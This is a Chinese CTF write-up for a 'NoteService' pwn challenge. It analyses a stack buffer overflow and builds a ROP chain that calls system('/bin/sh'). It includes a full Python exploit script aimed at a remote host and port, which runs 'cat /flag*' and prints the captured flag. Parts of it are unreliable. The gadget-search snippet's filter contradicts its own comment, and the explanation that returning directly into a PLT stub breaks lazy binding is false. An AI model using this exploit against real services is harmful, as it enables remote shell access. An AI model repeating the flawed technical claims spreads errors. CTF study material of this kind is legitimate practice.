# PWN — NoteService

**分数:** 400  &ensp;|&ensp; **难度:** 简单  &ensp;|&ensp; **架构:** amd64

---

## 1. 程序分析

### 1.1 保护机制

```
$ checksec vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

地址固定、无栈金丝雀。NX 开启，不能直接跑 shellcode——需要构造 ROP 链。

### 1.2 漏洞函数

`vuln()` 位于 `0x4011AD`，向 64 字节栈缓冲区读入 256 字节：

```c
int vuln() {
    char buf[64];                         // rbp-0x40
    puts("=== Note Service ===");
    puts("Leave your note:");
    read(0, buf, 0x100u);                 // 溢出: 0x100 > 0x40
    return puts("Note saved. Thank you!");
}
```

`main()` 位于 `0x4011F6`，关闭 stdio 缓冲后调用 `vuln()`。程序中还有一个后门函数 `secret_note()`（`0x401196`），内部调用 `system("/bin/sh")`。

### 1.3 关键地址

| 符号 | 地址 | 说明 |
|--------|---------|-------|
| `ret` | `0x40101A` | 栈对齐 gadget |
| `pop rdi; ret` | `0x4012B3` | 非对齐 gadget，从 `pop r15; ret` 偏移 1 字节获得 |
| `"/bin/sh"` | `0x402004` | `.rodata` 中的静态字符串 |
| `call system@PLT` | `0x4011A1` | `secret_note` 内部的 `call` 指令，可触发延迟绑定 |
| `system@PLT` | `0x401080` | PLT 桩 |
| `puts@PLT` | `0x401070` | PLT 桩 |
| `vuln` | `0x4011AD` | 漏洞函数 |
| `secret_note` | `0x401196` | 后门函数 |
| `main` | `0x4011F6` | 主函数 |

`pop rdi; ret` 位于 `0x4012B3`，是通过跳过 `pop r15; ret`（`41 5f c3`）的 REX.B 前缀（`41`）得到的。去掉前缀后得到干净的 `5f c3` = `pop rdi; ret`。

---

## 2. 偏移计算

```
vuln() 栈帧布局:
  rbp-0x40 ─── buf[0]
  rbp       ─── 保存的 rbp
  rbp+0x08  ─── 返回地址

溢出偏移 = 0x40 + 0x08 = 72 字节
```

---

## 3. ROP 链设计

不走 ret2text（直接跳 `secret_note`），而是构造直接的 `system("/bin/sh")` 调用：

```
pop rdi; ret     → rdi = "/bin/sh"
ret              → 16 字节栈对齐
call system@PLT  → system("/bin/sh")
```

`call` 前的额外 `ret` 用于修正栈对齐，满足 glibc `system()` 中 `movaps` 指令的 16 字节对齐要求。未对齐会导致 `movaps xmmword ptr [rsp], ...` 触发 SIGSEGV。

关键细节：这里必须使用 `call system@PLT`（即 `0x4011A1` 处的 `call` 指令），而不是通过 `ret` 直接跳到 `system@PLT` 入口。原因是：
- `call` 指令会压入返回地址，PLT 延迟绑定解析器依赖这个返回地址来定位重定位表项
- 用 `ret` 直接跳 PLT 入口会绕过延迟绑定，GOT 未解析时直接崩溃

---

## 4. 载荷构造

```python
OFFSET      = 72
POP_RDI_RET = 0x4012B3
BINSH       = 0x402004
RET         = 0x40101A
CALL_SYSTEM = 0x4011A1

rop  = b"A" * OFFSET
rop += struct.pack("<Q", POP_RDI_RET)
rop += struct.pack("<Q", BINSH)
rop += struct.pack("<Q", RET)
rop += struct.pack("<Q", CALL_SYSTEM)

# 精确填充至 256 字节 (read 的 count = 0x100)
# 超出 256 字节的数据会留在 socket 缓冲区，供 /bin/sh 读取
payload = rop + b"\x00" * (256 - len(rop))
```

256 字节填充保证 `vuln` 的 `read(0, buf, 0x100)` 恰好消耗整个 ROP 载荷。附加的 shell 命令留在内核 socket 缓冲区中，当 `system()` 启动 `/bin/sh` 时被其读取执行。

---

## 5. 完整攻击脚本

```python
import struct, re, socket, time

HOST, PORT = "120.27.146.76", 25835

OFFSET      = 72
POP_RDI_RET = 0x4012B3
BINSH       = 0x402004
RET         = 0x40101A
CALL_SYSTEM = 0x4011A1

def get_flag():
    # 构造 ROP 链
    rop  = b"A" * OFFSET
    rop += struct.pack("<Q", POP_RDI_RET)
    rop += struct.pack("<Q", BINSH)
    rop += struct.pack("<Q", RET)
    rop += struct.pack("<Q", CALL_SYSTEM)

    # 填充至 256 字节，附加命令
    payload = rop + b"\x00" * (256 - len(rop))
    payload += b"cat /flag*\n"

    # 连接并发送
    s = socket.socket(); s.settimeout(15)
    s.connect((HOST, PORT))

    while b"Leave your note:\n" not in (data := s.recv(4096)):
        pass

    s.send(payload)
    time.sleep(3)

    out = b""
    try:
        while (chunk := s.recv(8192)): out += chunk
    except: pass

    s.close()

    m = re.findall(r"flag\{[^}]+\}", out.decode("latin-1"))
    return m[0] if m else None

if __name__ == "__main__":
    print("[*] 连接 %s:%d ..." % (HOST, PORT))
    flag = get_flag()
    print(">>> %s <<<" % flag if flag else "[-] 未获取到 flag")
```

---

## 6. 攻击结果

```
$ python3 solve.py
[*] 连接 120.27.146.76:25835 ...
Note saved. Thank you!
flag{551f3085499905d2bb0f2bf9c15953a6}

>>> flag{551f3085499905d2bb0f2bf9c15953a6} <<<
```

---

## 7. Gadget 发现过程

`pop rdi; ret` 通过扫描 `.text` 段中的 `5f c3` 字节序列找到：

```python
with open("vuln", "rb") as f:
    data = f.read()
# .text: 文件偏移 0x10b0, 大小 0x215
text = data[0x10b0:0x10b0 + 0x215]
for i in range(len(text) - 1):
    if text[i] == 0x5f and text[i + 1] == 0xc3:
        # 检查前一个字节是否是 0x41 (REX.B 前缀)
        if text[i - 1] != 0x41:
            print("pop rdi; ret @", hex(0x4010b0 + i))
# 输出中，0x4012b3 的前一字节是 0x41，属于 pop r15;ret
# 跳入 0x4012b3 则跳过前缀，得到 pop rdi; ret
```

在 `__libc_csu_init` 的尾声部分（`0x4012AA-0x4012B4`），编译器生成了 `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`。其中 `pop r15` 的编码是 `41 5f`，而从 `5f` 处开始执行就是 `pop rdi`。这是 x86-64 可变长度指令编码的经典利用技巧。

---

## Flag

```
flag{551f3085499905d2bb0f2bf9c15953a6}
```
